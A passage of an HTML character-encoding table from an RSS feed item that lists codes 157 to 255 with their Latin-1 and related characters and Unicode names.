<td style="text-align:center"></td>
<td style="text-align:center">œ</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left">Latin small ligature oe</td>
</tr>
<tr>
<td style="text-align:center">157</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left">NOT USED</td>
</tr>
<tr>
<td style="text-align:center">158</td>
<td style="text-align:center"></td>
<td style="text-align:center">ž</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left">Latin small letter z with caron</td>
</tr>
<tr>
<td style="text-align:center">159</td>
<td style="text-align:center"></td>
<td style="text-align:center">Ÿ</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left">Latin capital letter Y with diaeresis</td>
</tr>
<tr>
<td style="text-align:center">160</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left">no-break space</td>
</tr>
<tr>
<td style="text-align:center">161</td>
<td style="text-align:center"></td>
<td style="text-align:center">¡</td>
<td style="text-align:center">¡</td>
<td style="text-align:center">¡</td>
<td style="text-align:left">inverted exclamation mark</td>
</tr>
<tr>
<td style="text-align:center">162</td>
<td style="text-align:center"></td>
<td style="text-align:center">¢</td>
<td style="text-align:center">¢</td>
<td style="text-align:center">¢</td>
<td style="text-align:left">cent sign</td>
</tr>
<tr>
<td style="text-align:center">163</td>
<td style="text-align:center"></td>
<td style="text-align:center">£</td>
<td style="text-align:center">£</td>
<td style="text-align:center">£</td>
<td style="text-align:left">pound sign</td>
</tr>
<tr>
<td style="text-align:center">164</td>
<td style="text-align:center"></td>
<td style="text-align:center">¤</td>
<td style="text-align:center">¤</td>
<td style="text-align:center">¤</td>
<td style="text-align:left">currency sign</td>
</tr>
<tr>
<td style="text-align:center">165</td>
<td style="text-align:center"></td>
<td style="text-align:center">¥</td>
<td style="text-align:center">¥</td>
<td style="text-align:center">¥</td>
<td style="text-align:left">yen sign</td>
</tr>
<tr>
<td style="text-align:center">166</td>
<td style="text-align:center"></td>
<td style="text-align:center">¦</td>
<td style="text-align:center">¦</td>
<td style="text-align:center">¦</td>
<td style="text-align:left">broken bar</td>
</tr>
<tr>
<td style="text-align:center">167</td>
<td style="text-align:center"></td>
<td style="text-align:center">§</td>
<td style="text-align:center">§</td>
<td style="text-align:center">§</td>
<td style="text-align:left">section sign</td>
</tr>
<tr>
<td style="text-align:center">168</td>
<td style="text-align:center"></td>
<td style="text-align:center">¨</td>
<td style="text-align:center">¨</td>
<td style="text-align:center">¨</td>
<td style="text-align:left">diaeresis</td>
</tr>
<tr>
<td style="text-align:center">169</td>
<td style="text-align:center"></td>
<td style="text-align:center">©</td>
<td style="text-align:center">©</td>
<td style="text-align:center">©</td>
<td style="text-align:left">copyright sign</td>
</tr>
<tr>
<td style="text-align:center">170</td>
<td style="text-align:center"></td>
<td style="text-align:center">ª</td>
<td style="text-align:center">ª</td>
<td style="text-align:center">ª</td>
<td style="text-align:left">feminine ordinal indicator</td>
</tr>
<tr>
<td style="text-align:center">171</td>
<td style="text-align:center"></td>
<td style="text-align:center">«</td>
<td style="text-align:center">«</td>
<td style="text-align:center">«</td>
<td style="text-align:left">left-pointing double angle quotation mark</td>
</tr>
<tr>
<td style="text-align:center">172</td>
<td style="text-align:center"></td>
<td style="text-align:center">¬</td>
<td style="text-align:center">¬</td>
<td style="text-align:center">¬</td>
<td style="text-align:left">not sign</td>
</tr>
<tr>
<td style="text-align:center">173</td>
<td style="text-align:center"></td>
<td style="text-align:center">­</td>
<td style="text-align:center">­</td>
<td style="text-align:center">­</td>
<td style="text-align:left">soft hyphen</td>
</tr>
<tr>
<td style="text-align:center">174</td>
<td style="text-align:center"></td>
<td style="text-align:center">®</td>
<td style="text-align:center">®</td>
<td style="text-align:center">®</td>
<td style="text-align:left">registered sign</td>
</tr>
<tr>
<td style="text-align:center">175</td>
<td style="text-align:center"></td>
<td style="text-align:center">¯</td>
<td style="text-align:center">¯</td>
<td style="text-align:center">¯</td>
<td style="text-align:left">macron</td>
</tr>
<tr>
<td style="text-align:center">176</td>
<td style="text-align:center"></td>
<td style="text-align:center">°</td>
<td style="text-align:center">°</td>
<td style="text-align:center">°</td>
<td style="text-align:left">degree sign</td>
</tr>
<tr>
<td style="text-align:center">177</td>
<td style="text-align:center"></td>
<td style="text-align:center">±</td>
<td style="text-align:center">±</td>
<td style="text-align:center">±</td>
<td style="text-align:left">plus-minus sign</td>
</tr>
<tr>
<td style="text-align:center">178</td>
<td style="text-align:center"></td>
<td style="text-align:center">²</td>
<td style="text-align:center">²</td>
<td style="text-align:center">²</td>
<td style="text-align:left">superscript two</td>
</tr>
<tr>
<td style="text-align:center">179</td>
<td style="text-align:center"></td>
<td style="text-align:center">³</td>
<td style="text-align:center">³</td>
<td style="text-align:center">³</td>
<td style="text-align:left">superscript three</td>
</tr>
<tr>
<td style="text-align:center">180</td>
<td style="text-align:center"></td>
<td style="text-align:center">´</td>
<td style="text-align:center">´</td>
<td style="text-align:center">´</td>
<td style="text-align:left">acute accent</td>
</tr>
<tr>
<td style="text-align:center">181</td>
<td style="text-align:center"></td>
<td style="text-align:center">µ</td>
<td style="text-align:center">µ</td>
<td style="text-align:center">µ</td>
<td style="text-align:left">micro sign</td>
</tr>
<tr>
<td style="text-align:center">182</td>
<td style="text-align:center"></td>
<td style="text-align:center">¶</td>
<td style="text-align:center">¶</td>
<td style="text-align:center">¶</td>
<td style="text-align:left">pilcrow sign</td>
</tr>
<tr>
<td style="text-align:center">183</td>
<td style="text-align:center"></td>
<td style="text-align:center">·</td>
<td style="text-align:center">·</td>
<td style="text-align:center">·</td>
<td style="text-align:left">middle dot</td>
</tr>
<tr>
<td style="text-align:center">184</td>
<td style="text-align:center"></td>
<td style="text-align:center">¸</td>
<td style="text-align:center">¸</td>
<td style="text-align:center">¸</td>
<td style="text-align:left">cedilla</td>
</tr>
<tr>
<td style="text-align:center">185</td>
<td style="text-align:center"></td>
<td style="text-align:center">¹</td>
<td style="text-align:center">¹</td>
<td style="text-align:center">¹</td>
<td style="text-align:left">superscript one</td>
</tr>
<tr>
<td style="text-align:center">186</td>
<td style="text-align:center"></td>
<td style="text-align:center">º</td>
<td style="text-align:center">º</td>
<td style="text-align:center">º</td>
<td style="text-align:left">masculine ordinal indicator</td>
</tr>
<tr>
<td style="text-align:center">187</td>
<td style="text-align:center"></td>
<td style="text-align:center">»</td>
<td style="text-align:center">»</td>
<td style="text-align:center">»</td>
<td style="text-align:left">right-pointing double angle quotation mark</td>
</tr>
<tr>
<td style="text-align:center">188</td>
<td style="text-align:center"></td>
<td style="text-align:center">¼</td>
<td style="text-align:center">¼</td>
<td style="text-align:center">¼</td>
<td style="text-align:left">vulgar fraction one quarter</td>
</tr>
<tr>
<td style="text-align:center">189</td>
<td style="text-align:center"></td>
<td style="text-align:center">½</td>
<td style="text-align:center">½</td>
<td style="text-align:center">½</td>
<td style="text-align:left">vulgar fraction one half</td>
</tr>
<tr>
<td style="text-align:center">190</td>
<td style="text-align:center"></td>
<td style="text-align:center">¾</td>
<td style="text-align:center">¾</td>
<td style="text-align:center">¾</td>
<td style="text-align:left">vulgar fraction three quarters</td>
</tr>
<tr>
<td style="text-align:center">191</td>
<td style="text-align:center"></td>
<td style="text-align:center">¿</td>
<td style="text-align:center">¿</td>
<td style="text-align:center">¿</td>
<td style="text-align:left">inverted question mark</td>
</tr>
<tr>
<td style="text-align:center">192</td>
<td style="text-align:center"></td>
<td style="text-align:center">À</td>
<td style="text-align:center">À</td>
<td style="text-align:center">À</td>
<td style="text-align:left">Latin capital letter A with grave</td>
</tr>
<tr>
<td style="text-align:center">193</td>
<td style="text-align:center"></td>
<td style="text-align:center">Á</td>
<td style="text-align:center">Á</td>
<td style="text-align:center">Á</td>
<td style="text-align:left">Latin capital letter A with acute</td>
</tr>
<tr>
<td style="text-align:center">194</td>
<td style="text-align:center"></td>
<td style="text-align:center">Â</td>
<td style="text-align:center">Â</td>
<td style="text-align:center">Â</td>
<td style="text-align:left">Latin capital letter A with circumflex</td>
</tr>
<tr>
<td style="text-align:center">195</td>
<td style="text-align:center"></td>
<td style="text-align:center">Ã</td>
<td style="text-align:center">Ã</td>
<td style="text-align:center">Ã</td>
<td style="text-align:left">Latin capital letter A with tilde</td>
</tr>
<tr>
<td style="text-align:center">196</td>
<td style="text-align:center"></td>
<td style="text-align:center">Ä</td>
<td style="text-align:center">Ä</td>
<td style="text-align:center">Ä</td>
<td style="text-align:left">Latin capital letter A with diaeresis</td>
</tr>
<tr>
<td style="text-align:center">197</td>
<td style="text-align:center"></td>
<td style="text-align:center">Å</td>
<td style="text-align:center">Å</td>
<td style="text-align:center">Å</td>
<td style="text-align:left">Latin capital letter A with ring above</td>
</tr>
<tr>
<td style="text-align:center">198</td>
<td style="text-align:center"></td>
<td style="text-align:center">Æ</td>
<td style="text-align:center">Æ</td>
<td style="text-align:center">Æ</td>
<td style="text-align:left">Latin capital letter AE</td>
</tr>
<tr>
<td style="text-align:center">199</td>
<td style="text-align:center"></td>
<td style="text-align:center">Ç</td>
<td style="text-align:center">Ç</td>
<td style="text-align:center">Ç</td>
<td style="text-align:left">Latin capital letter C with cedilla</td>
</tr>
<tr>
<td style="text-align:center">200</td>
<td style="text-align:center"></td>
<td style="text-align:center">È</td>
<td style="text-align:center">È</td>
<td style="text-align:center">È</td>
<td style="text-align:left">Latin capital letter E with grave</td>
</tr>
<tr>
<td style="text-align:center">201</td>
<td style="text-align:center"></td>
<td style="text-align:center">É</td>
<td style="text-align:center">É</td>
<td style="text-align:center">É</td>
<td style="text-align:left">Latin capital letter E with acute</td>
</tr>
<tr>
<td style="text-align:center">202</td>
<td style="text-align:center"></td>
<td style="text-align:center">Ê</td>
<td style="text-align:center">Ê</td>
<td style="text-align:center">Ê</td>
<td style="text-align:left">Latin capital letter E with circumflex</td>
</tr>
<tr>
<td style="text-align:center">203</td>
<td style="text-align:center"></td>
<td style="text-align:center">Ë</td>
<td style="text-align:center">Ë</td>
<td style="text-align:center">Ë</td>
<td style="text-align:left">Latin capital letter E with diaeresis</td>
</tr>
<tr>
<td style="text-align:center">204</td>
<td style="text-align:center"></td>
<td style="text-align:center">Ì</td>
<td style="text-align:center">Ì</td>
<td style="text-align:center">Ì</td>
<td style="text-align:left">Latin capital letter I with grave</td>
</tr>
<tr>
<td style="text-align:center">205</td>
<td style="text-align:center"></td>
<td style="text-align:center">Í</td>
<td style="text-align:center">Í</td>
<td style="text-align:center">Í</td>
<td style="text-align:left">Latin capital letter I with acute</td>
</tr>
<tr>
<td style="text-align:center">206</td>
<td style="text-align:center"></td>
<td style="text-align:center">Î</td>
<td style="text-align:center">Î</td>
<td style="text-align:center">Î</td>
<td style="text-align:left">Latin capital letter I with circumflex</td>
</tr>
<tr>
<td style="text-align:center">207</td>
<td style="text-align:center"></td>
<td style="text-align:center">Ï</td>
<td style="text-align:center">Ï</td>
<td style="text-align:center">Ï</td>
<td style="text-align:left">Latin capital letter I with diaeresis</td>
</tr>
<tr>
<td style="text-align:center">208</td>
<td style="text-align:center"></td>
<td style="text-align:center">Ð</td>
<td style="text-align:center">Ð</td>
<td style="text-align:center">Ð</td>
<td style="text-align:left">Latin capital letter Eth</td>
</tr>
<tr>
<td style="text-align:center">209</td>
<td style="text-align:center"></td>
<td style="text-align:center">Ñ</td>
<td style="text-align:center">Ñ</td>
<td style="text-align:center">Ñ</td>
<td style="text-align:left">Latin capital letter N with tilde</td>
</tr>
<tr>
<td style="text-align:center">210</td>
<td style="text-align:center"></td>
<td style="text-align:center">Ò</td>
<td style="text-align:center">Ò</td>
<td style="text-align:center">Ò</td>
<td style="text-align:left">Latin capital letter O with grave</td>
</tr>
<tr>
<td style="text-align:center">211</td>
<td style="text-align:center"></td>
<td style="text-align:center">Ó</td>
<td style="text-align:center">Ó</td>
<td style="text-align:center">Ó</td>
<td style="text-align:left">Latin capital letter O with acute</td>
</tr>
<tr>
<td style="text-align:center">212</td>
<td style="text-align:center"></td>
<td style="text-align:center">Ô</td>
<td style="text-align:center">Ô</td>
<td style="text-align:center">Ô</td>
<td style="text-align:left">Latin capital letter O with circumflex</td>
</tr>
<tr>
<td style="text-align:center">213</td>
<td style="text-align:center"></td>
<td style="text-align:center">Õ</td>
<td style="text-align:center">Õ</td>
<td style="text-align:center">Õ</td>
<td style="text-align:left">Latin capital letter O with tilde</td>
</tr>
<tr>
<td style="text-align:center">214</td>
<td style="text-align:center"></td>
<td style="text-align:center">Ö</td>
<td style="text-align:center">Ö</td>
<td style="text-align:center">Ö</td>
<td style="text-align:left">Latin capital letter O with diaeresis</td>
</tr>
<tr>
<td style="text-align:center">215</td>
<td style="text-align:center"></td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
<td style="text-align:left">multiplication sign</td>
</tr>
<tr>
<td style="text-align:center">216</td>
<td style="text-align:center"></td>
<td style="text-align:center">Ø</td>
<td style="text-align:center">Ø</td>
<td style="text-align:center">Ø</td>
<td style="text-align:left">Latin capital letter O with stroke</td>
</tr>
<tr>
<td style="text-align:center">217</td>
<td style="text-align:center"></td>
<td style="text-align:center">Ù</td>
<td style="text-align:center">Ù</td>
<td style="text-align:center">Ù</td>
<td style="text-align:left">Latin capital letter U with grave</td>
</tr>
<tr>
<td style="text-align:center">218</td>
<td style="text-align:center"></td>
<td style="text-align:center">Ú</td>
<td style="text-align:center">Ú</td>
<td style="text-align:center">Ú</td>
<td style="text-align:left">Latin capital letter U with acute</td>
</tr>
<tr>
<td style="text-align:center">219</td>
<td style="text-align:center"></td>
<td style="text-align:center">Û</td>
<td style="text-align:center">Û</td>
<td style="text-align:center">Û</td>
<td style="text-align:left">Latin capital letter U with circumflex</td>
</tr>
<tr>
<td style="text-align:center">220</td>
<td style="text-align:center"></td>
<td style="text-align:center">Ü</td>
<td style="text-align:center">Ü</td>
<td style="text-align:center">Ü</td>
<td style="text-align:left">Latin capital letter U with diaeresis</td>
</tr>
<tr>
<td style="text-align:center">221</td>
<td style="text-align:center"></td>
<td style="text-align:center">Ý</td>
<td style="text-align:center">Ý</td>
<td style="text-align:center">Ý</td>
<td style="text-align:left">Latin capital letter Y with acute</td>
</tr>
<tr>
<td style="text-align:center">222</td>
<td style="text-align:center"></td>
<td style="text-align:center">Þ</td>
<td style="text-align:center">Þ</td>
<td style="text-align:center">Þ</td>
<td style="text-align:left">Latin capital letter Thorn</td>
</tr>
<tr>
<td style="text-align:center">223</td>
<td style="text-align:center"></td>
<td style="text-align:center">ß</td>
<td style="text-align:center">ß</td>
<td style="text-align:center">ß</td>
<td style="text-align:left">Latin small letter sharp s</td>
</tr>
<tr>
<td style="text-align:center">224</td>
<td style="text-align:center"></td>
<td style="text-align:center">à</td>
<td style="text-align:center">à</td>
<td style="text-align:center">à</td>
<td style="text-align:left">Latin small letter a with grave</td>
</tr>
<tr>
<td style="text-align:center">225</td>
<td style="text-align:center"></td>
<td style="text-align:center">á</td>
<td style="text-align:center">á</td>
<td style="text-align:center">á</td>
<td style="text-align:left">Latin small letter a with acute</td>
</tr>
<tr>
<td style="text-align:center">226</td>
<td style="text-align:center"></td>
<td style="text-align:center">â</td>
<td style="text-align:center">â</td>
<td style="text-align:center">â</td>
<td style="text-align:left">Latin small letter a with circumflex</td>
</tr>
<tr>
<td style="text-align:center">227</td>
<td style="text-align:center"></td>
<td style="text-align:center">ã</td>
<td style="text-align:center">ã</td>
<td style="text-align:center">ã</td>
<td style="text-align:left">Latin small letter a with tilde</td>
</tr>
<tr>
<td style="text-align:center">228</td>
<td style="text-align:center"></td>
<td style="text-align:center">ä</td>
<td style="text-align:center">ä</td>
<td style="text-align:center">ä</td>
<td style="text-align:left">Latin small letter a with diaeresis</td>
</tr>
<tr>
<td style="text-align:center">229</td>
<td style="text-align:center"></td>
<td style="text-align:center">å</td>
<td style="text-align:center">å</td>
<td style="text-align:center">å</td>
<td style="text-align:left">Latin small letter a with ring above</td>
</tr>
<tr>
<td style="text-align:center">230</td>
<td style="text-align:center"></td>
<td style="text-align:center">æ</td>
<td style="text-align:center">æ</td>
<td style="text-align:center">æ</td>
<td style="text-align:left">Latin small letter ae</td>
</tr>
<tr>
<td style="text-align:center">231</td>
<td style="text-align:center"></td>
<td style="text-align:center">ç</td>
<td style="text-align:center">ç</td>
<td style="text-align:center">ç</td>
<td style="text-align:left">Latin small letter c with cedilla</td>
</tr>
<tr>
<td style="text-align:center">232</td>
<td style="text-align:center"></td>
<td style="text-align:center">è</td>
<td style="text-align:center">è</td>
<td style="text-align:center">è</td>
<td style="text-align:left">Latin small letter e with grave</td>
</tr>
<tr>
<td style="text-align:center">233</td>
<td style="text-align:center"></td>
<td style="text-align:center">é</td>
<td style="text-align:center">é</td>
<td style="text-align:center">é</td>
<td style="text-align:left">Latin small letter e with acute</td>
</tr>
<tr>
<td style="text-align:center">234</td>
<td style="text-align:center"></td>
<td style="text-align:center">ê</td>
<td style="text-align:center">ê</td>
<td style="text-align:center">ê</td>
<td style="text-align:left">Latin small letter e with circumflex</td>
</tr>
<tr>
<td style="text-align:center">235</td>
<td style="text-align:center"></td>
<td style="text-align:center">ë</td>
<td style="text-align:center">ë</td>
<td style="text-align:center">ë</td>
<td style="text-align:left">Latin small letter e with diaeresis</td>
</tr>
<tr>
<td style="text-align:center">236</td>
<td style="text-align:center"></td>
<td style="text-align:center">ì</td>
<td style="text-align:center">ì</td>
<td style="text-align:center">ì</td>
<td style="text-align:left">Latin small letter i with grave</td>
</tr>
<tr>
<td style="text-align:center">237</td>
<td style="text-align:center"></td>
<td style="text-align:center">í</td>
<td style="text-align:center">í</td>
<td style="text-align:center">í</td>
<td style="text-align:left">Latin small letter i with acute</td>
</tr>
<tr>
<td style="text-align:center">238</td>
<td style="text-align:center"></td>
<td style="text-align:center">î</td>
<td style="text-align:center">î</td>
<td style="text-align:center">î</td>
<td style="text-align:left">Latin small letter i with circumflex</td>
</tr>
<tr>
<td style="text-align:center">239</td>
<td style="text-align:center"></td>
<td style="text-align:center">ï</td>
<td style="text-align:center">ï</td>
<td style="text-align:center">ï</td>
<td style="text-align:left">Latin small letter i with diaeresis</td>
</tr>
<tr>
<td style="text-align:center">240</td>
<td style="text-align:center"></td>
<td style="text-align:center">ð</td>
<td style="text-align:center">ð</td>
<td style="text-align:center">ð</td>
<td style="text-align:left">Latin small letter eth</td>
</tr>
<tr>
<td style="text-align:center">241</td>
<td style="text-align:center"></td>
<td style="text-align:center">ñ</td>
<td style="text-align:center">ñ</td>
<td style="text-align:center">ñ</td>
<td style="text-align:left">Latin small letter n with tilde</td>
</tr>
<tr>
<td style="text-align:center">242</td>
<td style="text-align:center"></td>
<td style="text-align:center">ò</td>
<td style="text-align:center">ò</td>
<td style="text-align:center">ò</td>
<td style="text-align:left">Latin small letter o with grave</td>
</tr>
<tr>
<td style="text-align:center">243</td>
<td style="text-align:center"></td>
<td style="text-align:center">ó</td>
<td style="text-align:center">ó</td>
<td style="text-align:center">ó</td>
<td style="text-align:left">Latin small letter o with acute</td>
</tr>
<tr>
<td style="text-align:center">244</td>
<td style="text-align:center"></td>
<td style="text-align:center">ô</td>
<td style="text-align:center">ô</td>
<td style="text-align:center">ô</td>
<td style="text-align:left">Latin small letter o with circumflex</td>
</tr>
<tr>
<td style="text-align:center">245</td>
<td style="text-align:center"></td>
<td style="text-align:center">õ</td>
<td style="text-align:center">õ</td>
<td style="text-align:center">õ</td>
<td style="text-align:left">Latin small letter o with tilde</td>
</tr>
<tr>
<td style="text-align:center">246</td>
<td style="text-align:center"></td>
<td style="text-align:center">ö</td>
<td style="text-align:center">ö</td>
<td style="text-align:center">ö</td>
<td style="text-align:left">Latin small letter o with diaeresis</td>
</tr>
<tr>
<td style="text-align:center">247</td>
<td style="text-align:center"></td>
<td style="text-align:center">÷</td>
<td style="text-align:center">÷</td>
<td style="text-align:center">÷</td>
<td style="text-align:left">division sign</td>
</tr>
<tr>
<td style="text-align:center">248</td>
<td style="text-align:center"></td>
<td style="text-align:center">ø</td>
<td style="text-align:center">ø</td>
<td style="text-align:center">ø</td>
<td style="text-align:left">Latin small letter o with stroke</td>
</tr>
<tr>
<td style="text-align:center">249</td>
<td style="text-align:center"></td>
<td style="text-align:center">ù</td>
<td style="text-align:center">ù</td>
<td style="text-align:center">ù</td>
<td style="text-align:left">Latin small letter u with grave</td>
</tr>
<tr>
<td style="text-align:center">250</td>
<td style="text-align:center"></td>
<td style="text-align:center">ú</td>
<td style="text-align:center">ú</td>
<td style="text-align:center">ú</td>
<td style="text-align:left">Latin small letter u with acute</td>
</tr>
<tr>
<td style="text-align:center">251</td>
<td style="text-align:center"></td>
<td style="text-align:center">û</td>
<td style="text-align:center">û</td>
<td style="text-align:center">û</td>
<td style="text-align:left">Latin small letter with circumflex</td>
</tr>
<tr>
<td style="text-align:center">252</td>
<td style="text-align:center"></td>
<td style="text-align:center">ü</td>
<td style="text-align:center">ü</td>
<td style="text-align:center">ü</td>
<td style="text-align:left">Latin small letter u with diaeresis</td>
</tr>
<tr>
<td style="text-align:center">253</td>
<td style="text-align:center"></td>
<td style="text-align:center">ý</td>
<td style="text-align:center">ý</td>
<td style="text-align:center">ý</td>
<td style="text-align:left">Latin small letter y with acute</td>
</tr>
<tr>
<td style="text-align:center">254</td>
<td style="text-align:center"></td>
<td style="text-align:center">þ</td>
<td style="text-align:center">þ</td>
<td style="text-align:center">þ</td>
<td style="text-align:left">Latin small letter thorn</td>
</tr>
<tr>
<td style="text-align:center">255</td>
<td style="text-align:center"></td>
<td style="text-align:center">ÿ</td>
<td style="text-align:center">ÿ</td>
<td style="text-align:center">ÿ</td>
<td style="text-align:left">Latin small letter y with diaeresis</td>
</tr>
</tbody>
</table>
]]></content:encoded>
    </item>
  </channel>
</rss>